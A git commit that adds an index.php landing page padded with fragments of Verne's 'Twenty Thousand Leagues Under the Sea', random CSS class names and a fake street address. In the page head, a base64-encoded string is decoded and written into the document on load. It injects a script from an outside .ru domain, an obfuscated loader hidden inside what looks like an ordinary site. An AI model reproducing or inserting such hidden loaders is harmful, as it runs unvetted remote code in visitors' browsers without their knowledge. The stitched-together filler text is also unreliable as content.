4a55e4193ec6c53d4d5fc3550692dc12b3f516bd
ryiycsad <77596040+ryiycsad@users.noreply.github.com>
2021-01-18 03:28:12 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>If Captain Nemo does sometimes go on dry ground, said I, he at least chooses des</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl8xN2J1eXo2eTBnZHlsdzM2aTAiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="8jxier0hrld4onwegwpgg">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="cyhoh15oy0ug4ypt1bypr4o">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>If Captain Nemo does sometimes go on dry ground, said I, he at least chooses des</h1>
+	</section>
+
+
+	<section class="our-work" class="a7bd0pgbbtng7v51mz">
+		<h3 class="title">We returned through the forest, and completed our c</h3>
+		<p>Forty-two degrees. I think that, in the excess of his joy, the Canadian, if he had not talked so much, would have killed them all. But he contented himself with a single dozen of these interesting marsupians. These animals were small. They were a species of those kangaroo rabbits that live habitually in the hollows of trees, and whose speed is extreme; but they are moderately fat, and furnish, at least, estimable food. We were very satisfied with the results of the hunt. Happy Ned proposed to return to this enchanting island the next day, for he wished to depopulate it of all the eatable quadrupeds. But he reckoned without his host. And these musicians? said I, pointing out some works of Weber, Rossini, Mozart, Beethoven, Haydn, Meyerbeer, Herold, Wagner, Auber, Gounod, and a number of others scattered over a large model piano organ which occupied one of the panels of the drawing-room. All the day of the 22d of February we passed in the Sargasso Sea, where such fish as are partial to marine plants and fuci find abundant nourishment. The next, the ocean had returned to its accustomed aspect. From this time for nineteen days, from the 23d of February to the 12th of March, the Nautilus kept in the middle of the Atlantic, carrying us at a constant speed of a hundred leagues in twenty-four hours. Captain Nemo evidently intended accomplishing his submarine programme, and I imagined that he intended, after doubling Cape Horn, to return to the Australian seas of the Pacific. Ned Land had cause for fear. In these large seas, void of islands, we could not attempt to leave the boat. Nor had we any means of opposing Captain Nemo's will. Our only course was to submit; but what we could neither gain by force nor cunning, I liked to think might be obtained by persuasion. This voyage ended, would he not consent to restore our liberty, under an oath never to reveal his existence-an oath of honor which we should have religiously kept? But we must consider that delicate question with the captain. But was I free to claim this liberty? Had he not himself said from the beginning, in the firmest manner, that the secret of his life exacted from him our lasting imprisonment on board the Nautilus? And would not my four months' silence appear to him a tacit acceptance of our situation? And would not a return to the subject result in raising suspicions which might be hurtful to our projects if at some future time a favorable opportunity offered to return to them?</p>
+		<hr>
+
+		<ul class="grid" class="tayhp0t00xig07g">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="8jxier0hrld4onwegwpgg">
+		<h3 class="title">Right the helm, go ahead, cried the captai</h3>
+		<p>Very much embarrassed, after having vainly exhausted our philological resources, I knew not what part to take, when Conseil said: What country is it? My two companions stretched themselves on the cabin carpet, and were soon sound asleep. For my own part, too many thoughts crowded my brain, too many insoluble questions pressed upon me, too many fancies kept my eyes half open. Where were we? What strange power carried us on? I felt-or rather fancied I felt-the machine sinking down to the lowest beds of the sea. Dreadful nightmares beset me; I saw in these mysterious asylums a world of unknown animals, among which this submarine boat seemed to be of the same kind, living, moving, and formidable as they. Then my brain grew calmer, my imagination wandered into vague unconsciousness, and I soon fell into a deep sleep. I think that we are caught, captain.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="cyhoh15oy0ug4ypt1bypr4o" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="tayhp0t00xig07g" class="title">We can remain no longer in this boiling water, said I to the ca</h3>	
+		<p>Well, captain, but now we come to the real difficulty. I can understand your rising to the surface; but diving below the surface, does not your submarine contrivance encounter a pressure, and consequently undergo an upward thrust of one atmosphere for every thirty feet of water, just about fifteen pounds per square inch? Look. Perhaps in China; you know the Nautilus is a rapid traveler. It goes through water as swallows through the air, or as an express on the land. It does not fear frequented seas; who can say that it may not beat the coasts of France, England, or America, on which flight may be attempted as advantageously as here. The portion of the terrestrial globe which is covered by water is estimated at upward of eighty millions of acres. This fluid mass comprises two billions two hundred and fifty millions of cubic miles, forming a spherical body of a diameter of sixty leagues, the weight of which would be three quintillions of tons. To comprehend the meaning of these figures, it is necessary to observe that a quintillion is to a billion as a billion is to unity; in other words, there are as many billions in a quintillion as there are units in a billion. This mass of fluid is equal to about the quantity of water which would be discharged by all the rivers of the earth in forty thousand years.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="8jxier0hrld4onwegwpgg">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="cyhoh15oy0ug4ypt1bypr4o"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="a7bd0pgbbtng7v51mz"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="tayhp0t00xig07g"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>279 Alexis Branch, Suite 882, 63320-6443, Lake Mauricio, Virginia, United States</p>
+	</footer>
+
+</body>
+
+</html>
